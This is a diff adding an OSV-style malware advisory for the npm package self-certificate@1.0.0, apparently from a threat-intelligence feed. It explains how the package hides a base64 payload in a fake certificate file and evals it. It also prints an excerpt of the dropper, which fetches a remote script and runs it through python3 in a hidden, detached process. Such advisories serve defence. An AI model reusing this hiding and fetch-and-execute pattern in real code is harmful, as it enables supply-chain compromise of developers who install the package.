@@ -1,0 +1,58 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4227",
+  "aliases": [
+    "MAL-2026-5644"
+  ],
+  "modified": "2026-06-11T10:32:31Z",
+  "published": "2026-06-11T10:31:42Z",
+  "summary": "Malicious code in self-certificate (npm)",
+  "details": "Self-certificate@1.0.0 is a trojanized npm package. The main index.js exports generateCertificates() which calls loadSampleCertificate(), a function that reads sample/cert.pem, strips the PEM headers, base64-decodes the body, and evals the result. The decoded body is NOT a certificate — it is a malicious JavaScript payload: (async () =\u003e {... const { spawn } = require('child_process'); const url = Buffer.from(encoded_url, 'base64').toString(); const response = await fetch(url); const log = await response.text(); const p = spawn(os.platform() === 'win32' ? 'python' : 'python3', ['-'], { detached: true, windowsHide: true }); p.stdin.write(log);... })(); This fetches a second-stage script from a Dropbox-hosted URL and pipes it to python3 - in a detached hidden process. No NPM_TOKEN, GITHUB_TOKEN, or.npmrc theft markers found — the package is a remote code execution dropper.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "self-certificate",
+        "purl": "pkg:npm/self-certificate@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/self-certificate/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4227"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-11T10:31:42Z",
+      "indicators_observed": {}
+    }
+  }
+}
